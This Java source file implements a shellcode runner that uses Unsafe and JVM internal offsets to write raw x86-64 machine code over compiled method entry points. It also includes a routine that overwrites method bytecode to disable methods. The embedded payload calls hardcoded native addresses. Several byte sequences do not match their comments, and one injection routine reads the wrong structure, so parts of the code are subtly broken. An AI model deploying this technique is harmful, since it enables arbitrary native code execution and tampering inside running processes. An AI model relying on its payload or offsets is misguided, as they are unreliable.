package memory.me.xdark.shell;

import memory.mem.CTool;
import memory.mem.array.Array;
import memory.mem.base.CObject;
import memory.mem.constants.ConstantPool;
import memory.mem.klass.InstanceKlass;
import memory.mem.method.ConstMethod;
import memory.mem.method.Method;
import memory.one.helfy.JVM;
import memory.one.helfy.Type;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.tree.*;
import sun.misc.Unsafe;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.function.Function;

public final class ShellcodeRunner {
    private static final JVM jvm = JVM.INSTANCE;

    public static class MyClassLoader extends ClassLoader {
        private static final MyClassLoader INSTANCE = new MyClassLoader();

        public static MyClassLoader getInstance() {
            return INSTANCE;
        }

        public static void loadClasss(String name) {
            System.out.println("Loading class: " + name);
        }
    }

    public static void main(String[] args) throws IOException {
        MyClassLoader.loadClasss("a");
        byte[] a = ShellcodeRunner.class.getClassLoader().getResourceAsStream(MyClassLoader.class.getName().replace(".", "/").concat(".class")).readAllBytes();
        ClassNode cn = new ClassNode(Opcodes.ASM9);
        ClassReader cr = new ClassReader(a);
        cr.accept(cn, ClassReader.SKIP_FRAMES | ClassReader.SKIP_DEBUG);
        cn.name = cn.name + "a";
        for (MethodNode method : cn.methods) {
            if (method.name.equals("loadClasss")) {
                for (AbstractInsnNode instruction : method.instructions) {
                    if (instruction instanceof LdcInsnNode) {
                        LdcInsnNode ldc = new LdcInsnNode("Inject!");
                        method.instructions.set(instruction, ldc);
                    }
                }
            }
        }
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
        cn.accept(cw);
        inject(MyClassLoader.class, new byte[]{
                (byte) 0x48, (byte) 0x31, (byte) 0xC0,                     // xor rax, rax
                (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x20,         // add rsp, 0x20
                (byte) 0x48, (byte) 0x31, (byte) 0xD2,                     // xor rdx, rdx
                (byte) 0x48, (byte) 0x31, (byte) 0xC9,                     // xor rcx, rcx
                (byte) 0x48, (byte) 0xB9, (byte) 0x33, (byte) 0x25, (byte) 0x6F, (byte) 0x7D, (byte) 0x7F, (byte) 0x7F, (byte) 0x7F, (byte) 0x00, (byte) 0x00, // mov rcx, 0x7F7F7D6F2533
                (byte) 0x51,                                                 // push rcx
                (byte) 0x48, (byte) 0xB9, (byte) 0x58, (byte) 0x35, (byte) 0x6C, (byte) 0x7D, (byte) 0x7F, (byte) 0x7F, (byte) 0x7F, (byte) 0x7F, (byte) 0x00, (byte) 0x00, // mov rcx, 0x7F7F7D6C3558
                (byte) 0x51,                                                 // push rcx
                (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x20,         // sub rsp, 0x20
                (byte) 0x48, (byte) 0x31, (byte) 0xC9,                     // xor rcx, rcx
                (byte) 0x48, (byte) 0xB9, (byte) 0x45, (byte) 0x23, (byte) 0xD9, (byte) 0x77, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, // mov rcx, 0x77D92345
                (byte) 0xFF, (byte) 0xD1,                                 // call rcx
                (byte) 0x48, (byte) 0x31, (byte) 0xC0,                     // xor rax, rax
                (byte) 0x48, (byte) 0x83, (byte) 0xC0, (byte) 0x03,         // add rax, 0x3
                (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x20,         // sub rsp, 0x20
                (byte) 0x48, (byte) 0x31, (byte) 0xC9,                     // xor rcx, rcx
                (byte) 0x48, (byte) 0xB9, (byte) 0x4D, (byte) 0x23, (byte) 0xD9, (byte) 0x77, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, // mov rcx, 0x77D9234D
                (byte) 0xFF, (byte) 0xD1                                  // call rcx
        });
    }

    public static void inject(Class<?> target, byte[] payload) {
        Unsafe unsafe = JVMUtil.UNSAFE;
        //ClassReader reader = new ClassReader(payload);
        //Class<?> newClass = JDKUnsafe.defineClass0(reader.getClassName(), payload, 0, payload.length, MyClassLoader.getInstance(), ShellcodeRunner.class.getProtectionDomain());
        JVM jvm = ShellcodeRunner.jvm;
        int oopSize = jvm.intConstant("oopSize");
        long klassOffset = jvm.getInt(jvm.type("java_lang_Class").global("_klass_offset"));
        long klass = oopSize == 8 ? unsafe.getLong(target, klassOffset) : unsafe.getInt(target, klassOffset) & 0xffffffffL;

        long methodArray = jvm.getAddress(klass + jvm.type("InstanceKlass").offset("_methods"));
        int methodCount = jvm.getInt(methodArray);
        long methods = methodArray + jvm.type("Array<Method*>").offset("_data");

        long constMethodOffset = jvm.type("Method").offset("_constMethod");
        Type constMethodType = jvm.type("ConstMethod");
        Type constantPoolType = jvm.type("ConstantPool");
        long constantPoolOffset = constMethodType.offset("_constants");
        long nameIndexOffset = constMethodType.offset("_name_index");
        long signatureIndexOffset = constMethodType.offset("_signature_index");

        /*long klassNew = oopSize == 8 ? unsafe.getLong(newClass, klassOffset) : unsafe.getInt(newClass, klassOffset) & 0xffffffffL;
        long methodArrayNew = jvm.getAddress(klassNew + jvm.type("InstanceKlass").offset("_methods"));
        int methodCountNew = jvm.getInt(methodArrayNew);
        long methodsNew = methodArrayNew + jvm.type("Array<Method*>").offset("_data");*/
        long _from_compiled_entry = jvm.type("Method").offset("_from_compiled_entry");

        for (int i = 0; i < methodCount; i++) {
            long method = jvm.getAddress(methods + (long) i * oopSize);
            long constMethod = jvm.getAddress(method + constMethodOffset);

            long address = jvm.getAddress(constMethod + _from_compiled_entry);
            for (int j = 0, k = payload.length; j < k; j++) {
                unsafe.putByte(address + j, payload[j]);
            }

//            for (int iNew = 0; iNew < methodCountNew; iNew++) {
//                long methodNew = jvm.getAddress(methodsNew + (long) iNew * oopSize);
//                long constMethodNew = jvm.getAddress(methodNew + constMethodOffset);
//
//                long constantPoolNew = jvm.getAddress(constMethodNew + constantPoolOffset);
//                int nameIndexNew = jvm.getShort(constMethodNew + nameIndexOffset) & 0xffff;
//                int signatureIndexNew = jvm.getShort(constMethodNew + signatureIndexOffset) & 0xffff;
//
//                String methodNameNew = getSymbol(constantPoolNew + constantPoolType.size + (long) nameIndexNew * oopSize);
//                String methodDescriptorNew = getSymbol(constantPoolNew + constantPoolType.size + (long) signatureIndexNew * oopSize);
//
//                if (methodName.equals(methodNameNew) && methodDescriptor.equals(methodDescriptorNew)) {
//                    long address = jvm.getAddress(constMethod + _from_compiled_entry);
//                    for (int j = 0, k = payload.length; j < k; j++) {
//                        unsafe.putByte(address +j, payload[j]);
//                    }
//                }
//            }
        }
    }

    private static String getSymbol(long symbolAddress) {
        Type symbolType = jvm.type("Symbol");
        long symbol = jvm.getAddress(symbolAddress);
        long body = symbol + symbolType.offset("_body");
        int length = jvm.getShort(symbol + symbolType.offset("_length")) & 0xffff;

        byte[] b = new byte[length];
        for (int i = 0; i < length; i++) {
            b[i] = jvm.getByte(body + i);
        }
        return new String(b, StandardCharsets.UTF_8);
    }

    private static void setSymbol(long symbolAddress, String s) {
        byte[] b = s.getBytes();
        Type symbolType = jvm.type("Symbol");
        long symbol = jvm.getAddress(symbolAddress);
        long body = symbol + symbolType.offset("_body");
        jvm.putShort(symbol + symbolType.offset("_length"), (short) s.length());
        for (int j = 0, k = b.length; j < k; j++) {
            jvm.putByte(body + j, b[j]);
        }
    }

    private static final Map<Long, Byte> addressMap = new HashMap<>();

    public static void inject(Class<?> target, String name, String descriptor, byte[] payload) {
        Unsafe unsafe = JVMUtil.UNSAFE;
        JVM jvm = ShellcodeRunner.jvm;
        int oopSize = jvm.intConstant("oopSize");
        long klassOffset = jvm.getInt(jvm.type("java_lang_Class").global("_klass_offset"));
        long klass = oopSize == 8
                ? unsafe.getLong(target, klassOffset)
                : unsafe.getInt(target, klassOffset) & 0xffffffffL;

        long methodArray = jvm.getAddress(klass + jvm.type("InstanceKlass").offset("_methods"));
        int methodCount = jvm.getInt(methodArray);
        long methods = methodArray + jvm.type("Array<Method*>").offset("_data");

        long constMethodOffset = jvm.type("Method").offset("_constMethod");
        Type constMethodType = jvm.type("ConstMethod");
        Type constantPoolType = jvm.type("ConstantPool");
        long constantPoolOffset = constMethodType.offset("_constants");
        long nameIndexOffset = constMethodType.offset("_name_index");
        long signatureIndexOffset = constMethodType.offset("_signature_index");
        long _from_compiled_entry = jvm.type("Method").offset("_from_compiled_entry");

        for (int i = 0; i < methodCount; i++) {
            long method = jvm.getAddress(methods + (long) i * oopSize);
            long constMethod = jvm.getAddress(method + constMethodOffset);

            long constantPool = jvm.getAddress(constMethod + constantPoolOffset);
            int nameIndex = jvm.getShort(constMethod + nameIndexOffset) & 0xffff;
            int signatureIndex = jvm.getShort(constMethod + signatureIndexOffset) & 0xffff;

            if (name.equals(getSymbol(constantPool + constantPoolType.size + (long) nameIndex * oopSize))
                    && descriptor.equals(getSymbol(
                    constantPool + constantPoolType.size + (long) signatureIndex * oopSize))) {
                long address = jvm.getAddress(method + _from_compiled_entry);
                for (int j = 0, k = payload.length; j < k; j++) {
                    long value = address + j;
                    addressMap.put(value, unsafe.getByte(value));
                    unsafe.putByte(value, payload[j]);
                }
                return;
            }
        }
        throw new InternalError(target + "." + name + descriptor);
    }

    public static void rev(Class<?> target) {
        JVM jvm = ShellcodeRunner.jvm;
        Type constMethodType = jvm.type("ConstMethod");
        Type constantPoolType = jvm.type("ConstantPool");
        long methodArray = InstanceKlass.of(target).getField(InstanceKlass.CField._methods, jvm::getAddress);
        int methodCount = jvm.getInt(methodArray);
        long methods = new Array(methodArray, "Method*").getField(Array.CField._data, Function.identity());

        for (int i = 0; i < methodCount; i++) {
            ConstMethod constMethod = new ConstMethod(new Method(jvm.getAddress(methods + (long) i * CTool.oopSize)).getField(Method.CField._constMethod, jvm::getAddress));

            ConstantPool constantPool = new ConstantPool(constMethod.getField(ConstMethod.CField._constants, jvm::getAddress));
            int nameIndex = constMethod.getField(ConstMethod.CField._name_index, jvm::getShort) & 0xffff;
            int signatureIndex = constMethod.getField(ConstMethod.CField._signature_index, jvm::getShort) & 0xffff;

            String name = getSymbol(constantPool.getPtr() + constantPoolType.size + (long) nameIndex * CTool.oopSize);
            String desc = getSymbol(constantPool.getPtr() + constantPoolType.size + (long) signatureIndex * CTool.oopSize);

            if (name.startsWith("<") || name.contains("$") || name.contains("[")) {
                continue;
            }

            CObject address = new CObject(constMethod.getPtr() + constMethodType.size);

            int type = org.objectweb.asm.Type.getReturnType(desc).getSort();
            switch (type) {
                case org.objectweb.asm.Type.VOID -> jvm.putByte(address.getPtr(), (byte) Opcodes.RETURN);
                case org.objectweb.asm.Type.BOOLEAN, org.objectweb.asm.Type.INT, org.objectweb.asm.Type.CHAR,
                     org.objectweb.asm.Type.BYTE, org.objectweb.asm.Type.SHORT -> {
                    jvm.putByte(address.getPtr(), (byte) Opcodes.ICONST_0);
                    jvm.putByte(address.getPtr() + 1, (byte) Opcodes.IRETURN);
                }
                case org.objectweb.asm.Type.FLOAT -> {
                    jvm.putByte(address.getPtr(), (byte) Opcodes.FCONST_0);
                    jvm.putByte(address.getPtr() + 1, (byte) Opcodes.FRETURN);
                }
                case org.objectweb.asm.Type.LONG -> {
                    jvm.putByte(address.getPtr(), (byte) Opcodes.LCONST_0);
                    jvm.putByte(address.getPtr() + 1, (byte) Opcodes.LRETURN);
                }
                case org.objectweb.asm.Type.DOUBLE -> {
                    jvm.putByte(address.getPtr(), (byte) Opcodes.DCONST_0);
                    jvm.putByte(address.getPtr() + 1, (byte) Opcodes.DRETURN);
                }
                case org.objectweb.asm.Type.ARRAY, org.objectweb.asm.Type.OBJECT -> {
                    jvm.putByte(address.getPtr(), (byte) Opcodes.ACONST_NULL);
                    jvm.putByte(address.getPtr() + 1, (byte) Opcodes.ARETURN);
                }
            }
        }
    }
}

